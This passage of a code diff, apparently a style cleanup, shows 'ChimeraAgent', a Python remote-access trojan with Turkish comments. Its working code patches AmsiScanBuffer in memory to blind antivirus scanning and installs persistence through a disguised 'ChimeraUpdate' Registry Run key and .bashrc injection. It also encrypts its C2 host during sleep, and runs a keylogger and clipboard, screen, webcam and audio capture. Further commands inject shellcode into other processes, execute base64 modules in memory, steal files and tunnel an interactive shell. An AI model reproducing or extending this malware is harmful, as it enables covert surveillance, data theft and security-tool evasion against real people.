             key:  XOR anahtarı.
-            
+
         Returns:
             bytes: XOR uygulanmış veri.
         """
@@ -3179,123 +3345,121 @@ class ChimeraAgent:
     def _generate_sleep_key(self, length: int = 32) -> bytes:
         """Rastgele bir şifreleme anahtarı üretir."""
         return bytes([random.randint(0, 255) for _ in range(length)])
-    
+
     def _encrypt_sensitive_attrs(self, key: bytes) -> dict:
         """Agent'ın hassas özniteliklerini XOR ile şifreler.
-        
+
         Args:
             key: Şifreleme anahtarı.
-            
+
         Returns:
             dict: Şifrelenmiş orijinal değerlerin yedekleri.
         """
         backup = {}
-        
+
         # LHOST
         try:
-            host_bytes = self.host.encode('utf-8')
-            backup['host'] = host_bytes
+            host_bytes = self.host.encode("utf-8")
+            backup["host"] = host_bytes
             self.host = self._xor_memory(host_bytes, key).hex()
         except Exception:
             pass
-        
+
         # Port'u string olarak şifrele
         try:
-            port_bytes = str(self.port).encode('utf-8')
-            backup['port'] = self.port
-            self.port = int.from_bytes(self._xor_memory(port_bytes[:4].ljust(4, b'\x00'), key[:4]), 'big')
+            port_bytes = str(self.port).encode("utf-8")
+            backup["port"] = self.port
+            self.port = int.from_bytes(
+                self._xor_memory(port_bytes[:4].ljust(4, b"\x00"), key[:4]), "big"
+            )
         except Exception:
             pass
-        
+
         return backup
-    
+
     def _decrypt_sensitive_attrs(self, key: bytes, backup: dict):
         """Şifrelenmiş öznitelikleri geri çözer.
-        
+
         Args:
             key:    Şifreleme anahtarı.
             backup: _encrypt_sensitive_attrs'tan dönen yedek.
         """
-        if 'host' in backup:
-            try:
-                self.host = backup['host'].decode('utf-8')
-            except Exception:
-                pass
-        
-        if 'port' in backup:
-            try:
-                self.port = backup['port']
-            except Exception:
-                pass
+        if "host" in backup:
+            with contextlib.suppress(Exception):
+                self.host = backup["host"].decode("utf-8")
+
+        if "port" in backup:
+            with contextlib.suppress(Exception):
+                self.port = backup["port"]
 
     def _sleep_obfuscated(self, duration: float):
         """Güvenli uyku: Uyku süresinde bellekteki kritik verileri şifreler.
-        
+
         Normal time.sleep() yerine kullanılır. Uyku başlamadan önce
         hassas veriler XOR ile şifrelenir, uyandığında çözülür.
         Ayrıca jitter (rastgele sapma) eklenerek zamanlama analizi zorlaştırılır.
-        
+
         Args:
             duration: Uyku süresi (saniye).
         """
         # Jitter: ±%15 rastgele sapma
         jitter = duration * random.uniform(-0.15, 0.15)
         actual_duration = max(0.1, duration + jitter)
-        
+
         # Şifreleme anahtarı üret
         key = self._generate_sleep_key()
-        
+
         # Hassas verileri şifrele
         backup = self._encrypt_sensitive_attrs(key)
-        
+
         # Uyku
         time.sleep(actual_duration)
-        
+
         # Hassas verileri çöz
         self._decrypt_sensitive_attrs(key, backup)
-        
+
         # Anahtarı bellekten sil (üzerine yaz)
-        key = b'\x00' * len(key)
+        key = b"\x00" * len(key)
 
     # --------------------------------------------------------
     # Evasion (Atlatma) Teknikleri
     # --------------------------------------------------------
     def bypass_amsi(self) -> str:
         """AMSI (Antimalware Scan Interface) korumasını devre dışı bırakır (Windows).
-        
+
         Bellekteki amsi.dll içerisindeki AmsiScanBuffer fonksiyonunun başlangıcını
         patchleyerek her zaman temiz sonuç dönmesini sağlar.
-        
+
         Returns:
             str: İşlem sonucu
         """
         if sys.platform != "win32":
             return "[!] AMSI Bypass sadece Windows sistemlerde geçerlidir."
-            
+
         try:
             import ctypes
             from ctypes import wintypes
-            
+
             kernel32 = ctypes.windll.kernel32
-            
+
             # Gerekli DLL'i yükle (Zaten yüklü olabilir ama garanti olsun)
             # LoadLibraryA yerine LoadLibraryW unicode için daha güvenli
             h_amsi = kernel32.LoadLibraryW("amsi.dll")
             if not h_amsi:
                 return "[!] amsi.dll yüklenemedi (Sistemde AMSI olmayabilir)."
-                
+
             # AmsiScanBuffer adresini bul
             get_proc_address = kernel32.GetProcAddress
             get_proc_address.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
             get_proc_address.restype = ctypes.c_void_p
-            
+
             # Obfuscation: Fonksiyon adını parça parça birleştir (String taramasından kaçmak için)
             func_name = b"Amsi" + b"Scan" + b"Buffer"
             amsi_scan_buffer_addr = get_proc_address(h_amsi, func_name)
-            
+
             if not amsi_scan_buffer_addr:
                 return "[!] AmsiScanBuffer adresi bulunamadı."
-                
+
             # Mimariye uygun patch hazırla
             if struct.calcsize("P") * 8 == 64:
                 # x64 Patch
@@ -3307,67 +3471,70 @@ class ChimeraAgent:
                 # mov eax, 0x80070057
                 # ret 0x18 (Argümanları temizle - Stdcall)
                 patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC2\\x18\\x00"
-                
+
             # Bellek korumasını değiştir (RWX yap)
             # PAGE_EXECUTE_READWRITE = 0x40
             old_protect = ctypes.c_ulong()
-            
+
             # VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
             if not kernel32.VirtualProtect(
-                ctypes.c_void_p(amsi_scan_buffer_addr), 
-                len(patch), 
-                0x40, 
-                ctypes.byref(old_protect)
+                ctypes.c_void_p(amsi_scan_buffer_addr),
+                len(patch),
+                0x40,
+                ctypes.byref(old_protect),
             ):
                 return f"[!] Bellek izni değiştirilemedi. Hata Kodu: {kernel32.GetLastError()}"
-            
+
             # Patch'i uygula (memmove veya pointer ile yazma)
             # ctypes.memmove daha güvenilir
             ctypes.memmove(ctypes.c_void_p(amsi_scan_buffer_addr), patch, len(patch))
-            
+
             # Bellek korumasını eski haline getir
             kernel32.VirtualProtect(
-                ctypes.c_void_p(amsi_scan_buffer_addr), 
-                len(patch), 
-                old_protect, 
-                ctypes.byref(old_protect)
+                ctypes.c_void_p(amsi_scan_buffer_addr),
+                len(patch),
+                old_protect,
+                ctypes.byref(old_protect),
             )
-            
+
             return f"[+] AMSI Bypass başarıyla uygulandı! (Adres: {hex(amsi_scan_buffer_addr)})"
-            
+
         except Exception as e:
-            return f"[!] AMSI Bypass hatası: {str(e)}"
+            return f"[!] AMSI Bypass hatası: {e!s}"
 
     # --------------------------------------------------------
     # Persistence (Kalıcılık) Teknikleri
     # --------------------------------------------------------
     def install_persistence(self) -> str:
         """Ajanı sistem başlangıcında çalışacak şekilde ayarlar.
-        
+
         Windows: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
         Linux: .bashrc veya crontab
-        
+
         Returns:
             str: İşlem sonucu
         """
         try:
             # Mevcut dosya yolunu al
             current_exe = os.path.abspath(sys.argv[0])
-            
+
             if sys.platform == "win32":
                 try:
                     import winreg
+
                     key = winreg.HKEY_CURRENT_USER
                     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-                    
+
                     # Registry anahtarını aç
                     with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
-                        winreg.SetValueEx(reg_key, "ChimeraUpdate", 0, winreg.REG_SZ, current_exe)
-                        
+                        winreg.SetValueEx(
+                            reg_key, "ChimeraUpdate", 0, winreg.REG_SZ, current_exe
+                        )
+
                     return f"[+] Kalıcılık eklendi (Registry Run Key): {current_exe}"
                 except Exception as e:
-                    return f"[!] Registry hatası: {str(e)}"
-                    
+                    return f"[!] Registry hatası: {e!s}"
+
             else:
                 # Linux/Unix Persistence
                 try:
@@ -3375,28 +3542,28 @@ class ChimeraAgent:
                     bashrc_path = os.path.expanduser("~/.bashrc")
                     if os.path.exists(bashrc_path):
                         # Zaten ekli mi kontrol et
-                        with open(bashrc_path, "r") as f:
+                        with open(bashrc_path) as f:
                             if "ChimeraAgent" in f.read():
                                 return "[!] Kalıcılık zaten .bashrc dosyasında mevcut."
-                        
+
                         # Arka planda çalışacak şekilde ekle
                         # (nohup ... &)
                         cmd = f"\n# ChimeraAgent Persistence\nnohup python3 {current_exe} >/dev/null 2>&1 &\n"
-                        
+
                         with open(bashrc_path, "a") as f:
                             f.write(cmd)
-                            
+
                         return f"[+] Kalıcılık eklendi (.bashrc): {current_exe}"
                     else:
                         # Yöntem 2: Crontab (Eğer .bashrc yoksa)
                         # Not: Crontab manipülasyonu biraz daha karmaşık olabilir, şimdilik .bashrc yeterli.
                         return "[!] .bashrc bulunamadı, kalıcılık eklenemedi."
-                        
+
                 except Exception as e:
-                    return f"[!] Linux Persistence hatası: {str(e)}"
-                    
+                    return f"[!] Linux Persistence hatası: {e!s}"
+
         except Exception as e:
-            return f"[!] Kalıcılık hatası: {str(e)}"
+            return f"[!] Kalıcılık hatası: {e!s}"
 
     def remove_persistence(self) -> str:
         """Kalıcılık ayarlarını temizler."""
@@ -3404,42 +3571,43 @@ class ChimeraAgent:
             if sys.platform == "win32":
                 try:
                     import winreg
+
                     key = winreg.HKEY_CURRENT_USER
                     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-                    
+
                     with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                         winreg.DeleteValue(reg_key, "ChimeraUpdate")
-                        
+
                     return "[+] Kalıcılık kaldırıldı (Registry temizlendi)."
                 except FileNotFoundError:
                     return "[!] Kalıcılık zaten yok veya bulunamadı."
                 except Exception as e:
-                    return f"[!] Registry temizleme hatası: {str(e)}"
+                    return f"[!] Registry temizleme hatası: {e!s}"
             else:
                 try:
                     bashrc_path = os.path.expanduser("~/.bashrc")
                     if os.path.exists(bashrc_path):
-                        with open(bashrc_path, "r") as f:
+                        with open(bashrc_path) as f:
                             lines = f.readlines()
-                        
+
                         # ChimeraAgent içeren satırları filtrele
                         new_lines = []
                         removed = False
                         skip = False
-                        
+
                         for line in lines:
                             if "# ChimeraAgent Persistence" in line:
                                 skip = True
                                 removed = True
                                 continue
-                            if skip and "ChimeraAgent" in line: # Payload satırı
+                            if skip and "ChimeraAgent" in line:  # Payload satırı
                                 continue
-                            if skip and line.strip() == "": # Sonraki boş satır
+                            if skip and line.strip() == "":  # Sonraki boş satır
                                 skip = False
                                 continue
                             if not skip:
                                 new_lines.append(line)
-                                
+
                         if removed:
                             with open(bashrc_path, "w") as f:
                                 f.writelines(new_lines)
@@ -3449,19 +3617,19 @@ class ChimeraAgent:
                     else:
                         return "[!] .bashrc dosyası bulunamadı."
                 except Exception as e:
-                    return f"[!] Linux temizleme hatası: {str(e)}"
+                    return f"[!] Linux temizleme hatası: {e!s}"
         except Exception as e:
-            return f"[!] Kalıcılık kaldırma hatası: {str(e)}"
+            return f"[!] Kalıcılık kaldırma hatası: {e!s}"
 
     # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
     def shell_mode(self):
         """Etkileşimli shell modunu başlatır (Ayrı TCP Tüneli).
-        
+
         C2 soketini korumak için shell I/O ayrı bir TCP bağlantısı üzerinden
         yapılır. Bu sayede shell kapatıldığında ana C2 bağlantısı kopmaz.
-        
+
         Returns:
             str: Sentinel değer — ana döngü bunu cevap olarak göndermez.
         """
@@ -3475,10 +3643,10 @@ class ChimeraAgent:
         try:
             tunnel_srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             tunnel_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            tunnel_srv.bind(("0.0.0.0", 0))           # OS rastgele port atar
+            tunnel_srv.bind(("0.0.0.0", 0))  # OS rastgele port atar
             tunnel_port = tunnel_srv.getsockname()[1]
             tunnel_srv.listen(1)
-            tunnel_srv.settimeout(30)                  # 30 sn içinde handler bağlanmalı
+            tunnel_srv.settimeout(30)  # 30 sn içinde handler bağlanmalı
         except Exception as e:
             return f"[!] Shell tüneli açılamadı: {e}"
 
@@ -3488,14 +3656,14 @@ class ChimeraAgent:
         # ── 3. Handler'ın tünel bağlantısını kabul et ──────────────
         try:
             shell_sock, _ = tunnel_srv.accept()
-        except socket.timeout:
+        except TimeoutError:
             tunnel_srv.close()
             return "[!] Shell tüneli zaman aşımı: Handler bağlanamadı."
         except Exception as e:
             tunnel_srv.close()
             return f"[!] Shell tüneli kabul hatası: {e}"
         finally:
-            tunnel_srv.close()                        # Listener artık gereksiz
+            tunnel_srv.close()  # Listener artık gereksiz
 
         # ── 4. Subprocess başlat ───────────────────────────────────
         try:
@@ -3505,7 +3673,7 @@ class ChimeraAgent:
                 stdin=subprocess.PIPE,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
-                bufsize=0  # Unbuffered I/O
+                bufsize=0,  # Unbuffered I/O
             )
         except Exception as e:
             shell_sock.close()
@@ -3522,12 +3690,12 @@ class ChimeraAgent:
                     if not data:
                         stop_event.set()
                         break
-                    
+
                     # Çıkış kontrolü
                     if b"exit_shell_mode_now" in data:
                         stop_event.set()
                         break
-                        
+
                     process.stdin.write(data)
                     process.stdin.flush()
                 except Exception:
@@ -3559,20 +3727,20 @@ class ChimeraAgent:
                 stop_event.set()
 
         # ── 6. Temizlik — sadece shell soketini kapat ─────────────
-        try: process.terminate()
-        except: pass
-        try: shell_sock.close()
-        except: pass
+        with contextlib.suppress(BaseException):
+            process.terminate()
+        with contextlib.suppress(BaseException):
+            shell_sock.close()
 
         # C2 soketi (self.sock) DOKUNULMAZ — bağlantı kopmaz
         return "__SHELL_COMPLETED__"
 
     def execute_command(self, cmd: str) -> str:
         """Sistem komutu çalıştırır.
-        
+
         Args:
             cmd: Çalıştırılacak komut.
-            
+
         Returns:
             str: Komut çıktısı.
         """
@@ -3582,15 +3750,15 @@ class ChimeraAgent:
         if cmd_lower == "terminate":
             self.running = False
             return "Agent sonlandırılıyor..."
-        
+
         # Sistem bilgisi komutu
         if cmd_lower == "sysinfo":
             return self.get_detailed_sysinfo()
-        
+
         # Ortam analizi komutu (AV/EDR ve VM tespiti)
         if cmd_lower == "detect":
             return self.detect_environment()
-        
+
         # Ekran görüntüsü komutu (RAM üzerinden capture & transfer)
         if cmd_lower.startswith("screenshot"):
             try:
@@ -3604,11 +3772,11 @@ class ChimeraAgent:
                 return self.take_screenshot(quality, fmt)
             except ValueError:
                 return "[!] Geçersiz screenshot kalitesi (1-100)."
-                
+
         # Webcam Görüntüsü
         if cmd_lower == "webcam_snap":
             return self.take_webcam_snap()
-            
+
         # Audio Kaydı
         if cmd_lower.startswith("audio_record"):
             try:
@@ -3623,8 +3791,10 @@ class ChimeraAgent:
         # Keylogger Komutları
         if cmd_lower == "keylogger_start":
             if sys.platform != "win32":
-                return "[!] Keylogger şu an sadece Windows sistemlerde desteklenmektedir."
-            
+                return (
+                    "[!] Keylogger şu an sadece Windows sistemlerde desteklenmektedir."
+                )
+
             if self.keylogger.start():
                 return "[+] Keylogger başlatıldı (Arka planda çalışıyor)."
             else:
@@ -3640,9 +3810,9 @@ class ChimeraAgent:
             logs = self.keylogger.dump()
             if not logs:
                 return "KEYLOGGER_EMPTY"
-            
+
             # Logları Base64 encode et (Transfer güvenliği için)
-            b64_logs = base64.b64encode(logs.encode('utf-8')).decode('utf-8')
+            b64_logs = base64.b64encode(logs.encode("utf-8")).decode("utf-8")
             return f"KEYLOG_DUMP:{b64_logs}"
 
         # Clipboard Komutları
@@ -3650,12 +3820,12 @@ class ChimeraAgent:
             content = self.clipboard.get_text()
             if not content:
                 content = "[Pano Boş]"
-            
+
             # İçeriği güvenli transfer için base64 ile kodla
             # (Özel karakterler veya newlinelar protokolü bozmasın diye)
-            b64_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
+            b64_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")
             return f"CLIPBOARD_DATA:{b64_content}"
-            
+
         if cmd_lower == "amsi_bypass":
             return self.bypass_amsi()
 
@@ -3682,25 +3852,35 @@ class ChimeraAgent:
                     return "[!] Kullanım: inject_shellcode <PID> <HEX_SHELLCODE>"
 
                 target_pid = int(parts[1])
-                hex_sc     = parts[2].strip()
+                hex_sc = parts[2].strip()
 
                 # Hex string'i bytes'a çevir (boşluk/\x prefix toleranslı)
-                hex_sc_clean = hex_sc.replace(" ", "").replace("\\x", "").replace("0x", "")
+                hex_sc_clean = (
+                    hex_sc.replace(" ", "").replace("\\x", "").replace("0x", "")
+                )
                 shellcode = bytes.fromhex(hex_sc_clean)
 
                 # NtCreateThreadEx kullanılsın mı? (prefix: nt:)
                 use_nt = False
                 if parts[2].strip().startswith("nt:"):
                     use_nt = True
-                    hex_sc_clean = parts[2][3:].strip().replace(" ", "").replace("\\x", "").replace("0x", "")
+                    hex_sc_clean = (
+                        parts[2][3:]
+                        .strip()
+                        .replace(" ", "")
+                        .replace("\\x", "")
+                        .replace("0x", "")
+                    )
                     shellcode = bytes.fromhex(hex_sc_clean)
 
-                return self.injector.inject_shellcode(target_pid, shellcode, use_nt=use_nt)
+                return self.injector.inject_shellcode(
+                    target_pid, shellcode, use_nt=use_nt
+                )
 
             except ValueError as e:
-                return f"[!] Geçersiz PID veya shellcode formatı: {str(e)}"
+                return f"[!] Geçersiz PID veya shellcode formatı: {e!s}"
             except Exception as e:
-                return f"[!] inject_shellcode hatası: {str(e)}"
+                return f"[!] inject_shellcode hatası: {e!s}"
 
         # inject_shellcode_b64 <PID> <B64_SHELLCODE>
         #   Base64 encoded shellcode ile enjeksiyon (handler tarafından kullanılır).
@@ -3711,18 +3891,20 @@ class ChimeraAgent:
                     return "[!] Kullanım: inject_shellcode_b64 <PID> <BASE64_SHELLCODE>"
 
                 target_pid = int(parts[1])
-                use_nt     = False
-                b64_raw    = parts[2].strip()
+                use_nt = False
+                b64_raw = parts[2].strip()
 
                 if b64_raw.startswith("nt:"):
-                    use_nt  = True
+                    use_nt = True
                     b64_raw = b64_raw[3:]
 
                 shellcode = base64.b64decode(b64_raw)
-                return self.injector.inject_shellcode(target_pid, shellcode, use_nt=use_nt)
+                return self.injector.inject_shellcode(
+                    target_pid, shellcode, use_nt=use_nt
+                )
 
             except Exception as e:
-                return f"[!] inject_shellcode_b64 hatası: {str(e)}"
+                return f"[!] inject_shellcode_b64 hatası: {e!s}"
 
         # inject_migrate <PID>  &  inject_migrate <PID> <B64_SHELLCODE>
         #   Migration: varsa shellcode ile, yoksa bilgi verir.
@@ -3739,46 +3921,44 @@ class ChimeraAgent:
                     shellcode = base64.b64decode(parts[2].strip())
                     tmp_sc_path = os.path.join(
                         __import__("tempfile").gettempdir(),
-                        f".mig_{os.getpid()}_{target_pid}.bin"
+                        f".mig_{os.getpid()}_{target_pid}.bin",
                     )
                     try:
                         with open(tmp_sc_path, "wb") as _f:
                             _f.write(shellcode)
                         result = self.injector.migrate(target_pid, tmp_sc_path)
                     finally:
-                        try:
+                        with contextlib.suppress(Exception):
                             os.remove(tmp_sc_path)
-                        except Exception:
-                            pass
                     return result
                 else:
                     return self.injector.migrate(target_pid)
 
             except ValueError as e:
-                return f"[!] Geçersiz PID: {str(e)}"
+                return f"[!] Geçersiz PID: {e!s}"
             except Exception as e:
-                return f"[!] inject_migrate hatası: {str(e)}"
+                return f"[!] inject_migrate hatası: {e!s}"
 
         if cmd_lower.startswith("clipboard_set "):
             try:
                 # Komuttan metni ayır (clipboard_set <text>)
-                text_to_set = cmd[14:].strip() # "clipboard_set " uzunluğu 14
-                
+                text_to_set = cmd[14:].strip()  # "clipboard_set " uzunluğu 14
+
                 # Eğer base64 olarak gönderilmişse decode et (opsiyonel, şimdilik raw text)
                 # Ancak kullanıcı direkt "clipboard_set hello world" yazarsa raw metindir.
-                
+
                 if self.clipboard.set_text(text_to_set):
                     return f"[+] Pano içeriği değiştirildi: '{text_to_set[:20]}...'"
                 else:
                     return "[!] Pano içeriği değiştirilemedi."
             except Exception as e:
-                return f"[!] Pano yazma hatası: {str(e)}"
+                return f"[!] Pano yazma hatası: {e!s}"
 
         # ── Port Forwarding ────────────────────────────
         if cmd_lower.startswith("portfwd "):
             try:
                 pf_parts = cmd.strip().split()
-                sub_cmd  = pf_parts[1].lower() if len(pf_parts) > 1 else ""
+                sub_cmd = pf_parts[1].lower() if len(pf_parts) > 1 else ""
 
                 if sub_cmd == "add":
                     # portfwd add -L <bind> -r <remote> -p <port>
@@ -3786,19 +3966,21 @@ class ChimeraAgent:
                     remote_host = ""
                     remote_port = 0
                     bind_host = "127.0.0.1"
-                    
+
                     for i, part in enumerate(pf_parts):
                         if part.lower() == "-l" and i + 1 < len(pf_parts):
-                            bind_port = int(pf_parts[i+1])
+                            bind_port = int(pf_parts[i + 1])
                         elif part.lower() == "-r" and i + 1 < len(pf_parts):
-                            remote_host = pf_parts[i+1]
+                            remote_host = pf_parts[i + 1]
                         elif part.lower() == "-p" and i + 1 < len(pf_parts):
-                            remote_port = int(pf_parts[i+1])
-                            
+                            remote_port = int(pf_parts[i + 1])
+
                     if not bind_port or not remote_host or not remote_port:
                         return "[!] Kullanım: portfwd add -L <bind_port> -r <remote_host> -p <remote_port>"
-                        
-                    return self.port_forwarder.add(bind_host, bind_port, remote_host, remote_port)
+
+                    return self.port_forwarder.add(
+                        bind_host, bind_port, remote_host, remote_port
+                    )
 
                 elif sub_cmd == "del":
                     if len(pf_parts) < 3:
@@ -3829,7 +4011,7 @@ class ChimeraAgent:
         if cmd_lower.startswith("netscan "):
             try:
                 ns_parts = cmd.strip().split()
-                sub_cmd  = ns_parts[1].lower() if len(ns_parts) > 1 else ""
+                sub_cmd = ns_parts[1].lower() if len(ns_parts) > 1 else ""
 
                 if sub_cmd == "sweep":
                     # netscan sweep <CIDR> [timeout]
@@ -3861,7 +4043,9 @@ class ChimeraAgent:
                     host = ns_parts[2]
                     port_range = ns_parts[3] if len(ns_parts) > 3 else "1-1024"
                     timeout = float(ns_parts[4]) if len(ns_parts) > 4 else 0.5
-                    return self.net_scanner.port_scan(host, port_range=port_range, timeout=timeout)
+                    return self.net_scanner.port_scan(
+                        host, port_range=port_range, timeout=timeout
+                    )
 
                 else:
                     return (
@@ -3880,7 +4064,7 @@ class ChimeraAgent:
             # shell_mode artık ayrı tünel kullanıyor, C2 soketine dokunmuyor.
             # Tünel port bilgisini kendi gönderir, sentinel döner.
             return self.shell_mode()
-        
+
         # Modül Yönetimi - Hafızadan modül yükleme ve çalıştırma
         if cmd_lower.startswith("loadmodule "):
             try:
@@ -3888,26 +4072,26 @@ class ChimeraAgent:
                 parts = cmd.split(" ", 2)
                 if len(parts) < 3:
                     return "[!] Kullanım: loadmodule <name> <b64_code>"
-                
+
                 module_name = parts[1]
                 b64_code = parts[2]
-                
+
                 # Base64 decode
                 code = base64.b64decode(b64_code).decode("utf-8")
-                
+
                 # Yeni modül oluştur
                 mod = types.ModuleType(module_name)
-                
+
                 # Kodu modül context'inde çalıştır
                 exec(code, mod.__dict__)
-                
+
                 # Modülü sisteme kaydet
                 sys.modules[module_name] = mod
                 self.loaded_modules[module_name] = mod
-                
+
                 return f"[+] Modül '{module_name}' hafızaya yüklendi."
             except Exception as e:
-                return f"[!] Modül yükleme hatası: {str(e)}"
+                return f"[!] Modül yükleme hatası: {e!s}"
 
         elif cmd.startswith("runmodule "):
             try:
@@ -3915,36 +4099,42 @@ class ChimeraAgent:
                 parts = cmd.strip().split(" ")
                 if len(parts) < 2:
                     return "[!] Kullanım: runmodule <name> [func]"
-                
+
                 module_name = parts[1]
                 func_name = parts[2] if len(parts) > 2 else "run"
                 args = parts[3:]
-                
+
                 if module_name not in self.loaded_modules:
                     return f"[!] Hata: '{module_name}' modülü yüklü değil."
-                
+
                 mod = self.loaded_modules[module_name]
-                
+
                 if not hasattr(mod, func_name):
                     return f"[!] Hata: '{func_name}' fonksiyonu bulunamadı."
-                
+
                 # Fonksiyonu çalıştır
                 func = getattr(mod, func_name)
-                
+
                 # Argümanları dinamik olarak ilet
                 if args:
                     result = func(*args)
                 else:
                     result = func()
-                    
-                return str(result) if result is not None else "[+] Fonksiyon çalıştırıldı (Dönüş değeri yok)."
+
+                return (
+                    str(result)
+                    if result is not None
+                    else "[+] Fonksiyon çalıştırıldı (Dönüş değeri yok)."
+                )
             except Exception as e:
-                return f"[!] Modül çalıştırma hatası: {str(e)}"
+                return f"[!] Modül çalıştırma hatası: {e!s}"
 
         elif cmd.strip() == "listmodules":
             if not self.loaded_modules:
                 return "[-] Yüklü modül yok."
-            return "Yüklü Modüller:\n" + "\n".join([f"- {name}" for name in self.loaded_modules.keys()])
+            return "Yüklü Modüller:\n" + "\n".join(
+                [f"- {name}" for name in self.loaded_modules]
+            )
 
         # Özel komutlar - Dizin Değiştirme (cd)
         if cmd_lower.startswith("cd "):
@@ -3957,8 +4147,8 @@ class ChimeraAgent:
             except FileNotFoundError:
                 return f"[!] Hata: Dizin bulunamadı: {target_dir}"
             except Exception as e:
-                return f"[!] Hata: {str(e)}"
-        
+                return f"[!] Hata: {e!s}"
+
         # Özel komutlar - Mevcut Dizin (pwd)
         elif cmd_lower == "pwd":
             return os.getcwd()
@@ -3970,14 +4160,14 @@ class ChimeraAgent:
                 target_dir = cmd.strip()[3:].strip()
                 if not target_dir:
                     target_dir = os.getcwd()
-                
+
                 if not os.path.exists(target_dir):
                     return f"[!] Hata: Dizin bulunamadı: {target_dir}"
-                
+
                 entries = os.listdir(target_dir)
                 output = f"Dizin Listesi: {target_dir}\n"
                 output += "-" * 50 + "\n"
-                
+
                 # Dosya ve klasörleri ayrıştır
                 dirs = []
                 files = []
@@ -3988,11 +4178,11 @@ class ChimeraAgent:
                     else:
                         size = os.path.getsize(full_path)
                         files.append(f"[FILE] {entry} ({size} bytes)")
-                
+
                 output += "\n".join(sorted(dirs) + sorted(files))
                 return output
             except Exception as e:
-                return f"[!] Listeleme hatası: {str(e)}"
+                return f"[!] Listeleme hatası: {e!s}"
 
         # Özel komutlar - Klasör Oluşturma (mkdir)
         elif cmd_lower.startswith("mkdir "):
@@ -4001,7 +4191,7 @@ class ChimeraAgent:
                 os.makedirs(path, exist_ok=True)
                 return f"[+] Klasör oluşturuldu: {path}"
             except Exception as e:
-                return f"[!] Oluşturma hatası: {str(e)}"
+                return f"[!] Oluşturma hatası: {e!s}"
 
         # Özel komutlar - Dosya/Klasör Silme (rm)
         elif cmd_lower.startswith("rm "):
@@ -4009,6 +4199,7 @@ class ChimeraAgent:
                 path = cmd.strip()[3:].strip()
                 if os.path.isdir(path):
                     import shutil
+
                     shutil.rmtree(path)
                     return f"[+] Klasör silindi: {path}"
                 elif os.path.isfile(path):
@@ -4017,7 +4208,7 @@ class ChimeraAgent:
                 else:
                     return f"[!] Bulunamadı: {path}"
             except Exception as e:
-                return f"[!] Silme hatası: {str(e)}"
+                return f"[!] Silme hatası: {e!s}"
 
         # Özel komutlar - Dosya İndirme (download)
         # Kullanım: download <remote_path>
@@ -4026,18 +4217,18 @@ class ChimeraAgent:
                 file_path = cmd.strip()[9:].strip()
                 if not os.path.exists(file_path):
                     return f"[!] Hata: Dosya bulunamadı: {file_path}"
-                
+
                 if os.path.isdir(file_path):
-                    return f"[!] Hata: Bu bir klasör, dosya değil."
+                    return "[!] Hata: Bu bir klasör, dosya değil."
 
                 with open(file_path, "rb") as f:
                     file_content = f.read()
-                    b64_content = base64.b64encode(file_content).decode('utf-8')
-                
+                    b64_content = base64.b64encode(file_content).decode("utf-8")
+
                 # Özel bir prefix ile gönderiyoruz ki handler bunu anlayıp dosyaya yazabilsin
                 return f"DOWNLOAD_OK:{b64_content}"
             except Exception as e:
-                return f"[!] İndirme hatası: {str(e)}"
+                return f"[!] İndirme hatası: {e!s}"
 
         # Chunked Download
         elif cmd_lower.startswith("download_chunk "):
@@ -4045,25 +4236,25 @@ class ChimeraAgent:
                 parts = cmd.split(" ", 3)
                 if len(parts) < 4:
                     return "[!] Hata: download_chunk <remote_path> <offset> <size>"
-                
+
                 file_path = parts[1].strip()
                 offset = int(parts[2].strip())
                 size = int(parts[3].strip())
-                
+
                 if not os.path.exists(file_path):
                     return f"[!] Hata: Dosya bulunamadı: {file_path}"
-                
+
                 if os.path.isdir(file_path):
-                    return f"[!] Hata: Bu bir klasör, dosya değil."
+                    return "[!] Hata: Bu bir klasör, dosya değil."
 
                 with open(file_path, "rb") as f:
                     f.seek(offset)
                     chunk_data = f.read(size)
-                    b64_content = base64.b64encode(chunk_data).decode('utf-8')
-                
+                    b64_content = base64.b64encode(chunk_data).decode("utf-8")
+
                 return f"DOWNLOAD_CHUNK_OK:{b64_content}"
             except Exception as e:
-                return f"[!] İndirme hatası: {str(e)}"
+                return f"[!] İndirme hatası: {e!s}"
 
         # Dosya boyutu (Chunked Transfer İçin)
         elif cmd_lower.startswith("file_size "):
@@ -4076,7 +4267,7 @@ class ChimeraAgent:
                 size = os.path.getsize(file_path)
                 return f"FILE_SIZE_OK:{size}"
             except Exception as e:
-                return f"FILE_SIZE_ERROR:{str(e)}"
+                return f"FILE_SIZE_ERROR:{e!s}"
 
         # Özel komutlar - Dosya Yükleme (upload)
         # Kullanım: upload <hedef_yol> <b64_data>
@@ -4087,18 +4278,18 @@ class ChimeraAgent:
                 parts = cmd.split(" ", 2)
                 if len(parts) < 3:
                     return "[!] Hata: upload <path> <b64_data>"
-                
+
                 target_path = parts[1]
                 b64_data = parts[2]
-                
+
                 file_content = base64.b64decode(b64_data)
-                
+
                 with open(target_path, "wb") as f:
                     f.write(file_content)
-                    
+
                 return f"[+] Dosya başarıyla yüklendi: {target_path} ({len(file_content)} bytes)"
             except Exception as e:
-                return f"[!] Yükleme hatası: {str(e)}"
+                return f"[!] Yükleme hatası: {e!s}"
 
         # Chunked Upload
         elif cmd.startswith("upload_chunk "):
@@ -4106,24 +4297,24 @@ class ChimeraAgent:
                 parts = cmd.split(" ", 3)
                 if len(parts) < 4:
                     return "[!] Hata: upload_chunk <path> <offset> <b64_data>"
-                
+
                 target_path = parts[1]
                 offset = int(parts[2])
                 b64_data = parts[3]
-                
+
                 file_content = base64.b64decode(b64_data)
-                
+
                 mode = "r+b" if os.path.exists(target_path) else "wb"
                 if offset == 0:
                     mode = "wb"
-                
+
                 with open(target_path, mode) as f:
                     f.seek(offset)
                     f.write(file_content)
-                    
+
